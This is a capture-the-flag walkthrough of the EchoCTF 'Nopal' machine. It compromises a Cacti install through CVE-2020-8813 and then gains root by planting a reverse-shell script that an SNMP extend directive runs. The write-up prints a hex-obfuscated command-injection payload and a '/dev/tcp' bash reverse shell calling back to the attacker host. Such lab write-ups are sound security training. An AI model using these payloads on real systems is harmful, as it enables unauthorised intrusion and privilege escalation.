![image](https://user-images.githubusercontent.com/87468669/220216679-cc40eab0-fe62-46bb-84a0-25f4c3074390.png)

first enumeration with nmap

`nmap -sC -sV -T4 -oN normal.tcp -p 80 -Pn 10.0.30.124`

```
# Nmap 7.93 scan initiated Mon Feb 20 16:51:24 2023 as: nmap -sC -sV -T4 -oN normal.tcp -p 80 -Pn 10.0.30.124
Nmap scan report for 10.0.30.124
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.10.3
|_http-server-header: nginx/1.10.3
|_http-title: Site doesn't have a title (text/html).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Feb 20 16:51:36 2023 -- 1 IP address (1 host up) scanned in 12.18 seconds
```
cool we have only one port open.

![image](https://user-images.githubusercontent.com/87468669/220217073-41433ddc-cf9a-443c-8cb9-8a50f172456f.png)

we noticed a webserver running on port 80, opening it on a browser we got redirected to a `cacti` cms page requiring us to login. let's look for an exploit.

![image](https://user-images.githubusercontent.com/87468669/220217276-e5ce4418-5483-441d-b702-6edb6246b21f.png)

found an exploit on github. let's clone the exploit and run it.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/EchoCTF/Nopal]
└─$ cd Cacti-CVE-2020-8813      
                                                                                                                                                                      
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/EchoCTF/Nopal/Cacti-CVE-2020-8813]
└─$ ls -al
total 28
drwxr-xr-x 3 n16hth4wk n16hth4wk 4096 Feb 20 17:07 .
drwxr-xr-x 3 n16hth4wk n16hth4wk 4096 Feb 20 17:32 ..
-rw-r--r-- 1 n16hth4wk n16hth4wk 2061 Feb 20 17:07 cacti_rce.py
-rw-r--r-- 1 n16hth4wk n16hth4wk 1963 Feb 20 17:07 cacti_rce.py.old
drwxr-xr-x 8 n16hth4wk n16hth4wk 4096 Feb 20 17:07 .git
-rw-r--r-- 1 n16hth4wk n16hth4wk 1064 Feb 20 17:07 LICENSE
-rw-r--r-- 1 n16hth4wk n16hth4wk  511 Feb 20 17:07 README.md
                                                                                                                                                                      
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/EchoCTF/Nopal/Cacti-CVE-2020-8813]
└─$ python cacti_rce.py -u http://10.0.30.124/cacti/ -l 10.10.1.50 1337
;echo${IFS}62617368202d69203e262f6465762f7463702f31302e31302e312e35302f34343320303e2631|xxd${IFS}-p${IFS}-r|bash
[+] S3nd1ng 3v1l r3qu3st, SHELL???? [+]
[+] Burn1ng C4ct1!! [+]
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.0.30.124.
Ncat: Connection from 10.0.30.124:58664.
bash: cannot set terminal process group (421): Inappropriate ioctl for device
bash: no job control in this shell
www-data@nopal:/opt/cacti$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@nopal:/opt/cacti$ 
```
Bull's eye we got a reverse shell, let's escalate privs.


## Privilege Escalation

```
www-data@nopal:/tmp$ ss -tulnp
Netid  State      Recv-Q Send-Q                                Local Address:Port                                               Peer Address:Port              
udp    UNCONN     3840   0                                         127.0.0.1:161                                                           *:*                  
udp    UNCONN     0      0                                        127.0.0.11:57560                                                         *:*                  
tcp    LISTEN     0      128                                               *:80                                                            *:*                   users:(("nginx",pid=441,fd=6),("nginx",pid=440,fd=6))
tcp    LISTEN     0      128                                      127.0.0.11:33283                                                         *:*                  
tcp    LISTEN     0      80                                        127.0.0.1:3306                                                          *:*                  
www-data@nopal:/tmp$
```
running the command `ss -tulnp` we can see a udp port running locally on this box. 

```
www-data@nopal:/tmp$ cat /etc/snmp/snmpd.conf 
agentAddress  udp:127.0.0.1:161

view   systemonly  included   .1.3.6.1.2.1.1
view   systemonly  included   .1.3.6.1.2.1.25.1
sysLocation    ETSCTF_4352d9eb155ffe427fd322e2325d6117
sysContact     echoCTF.RED <info@echoctf.red>
sysServices    72

rocommunity public default
rwcommunity private default
extend etsctf /tmp/snmpd-tests.sh
www-data@nopal:/tmp$ 
```
checking the snmpd.conf file we can see that the snmp server is extending `/tmp/snmpd-tests.sh` let's check the content of the file.

```
www-data@nopal:/tmp$ ls -al /tmp/snmpd-tests.sh
-rwxr-xr-x 1 www-data www-data 87 Feb 21 00:12 /tmp/snmpd-tests.sh
www-data@nopal:/tmp$ cat /tmp/snmpd-tests.sh
#!/bin/bash

/bin/bash -c 'bash -i >& /dev/tcp/10.10.1.50/1337 0>&1'
www-data@nopal:/tmp$
www-data@nopal:/tmp$ chmod 777 snmpd-tests.sh 
```
injected a malicious payload into the `/tmp/snmpd-tests.sh` file. to trigger the payload we run `snmpwalk localhost -c public -v1 .`

![image](https://user-images.githubusercontent.com/87468669/220221352-c4fcebb8-8d04-4cac-b9ca-1a4580c9a4bb.png)

And Boom we got reverse shell as root. 

![image](https://user-images.githubusercontent.com/87468669/220222512-df2041d8-8efb-468b-a0e1-b2c0ea0dabdd.png)
and we are through.
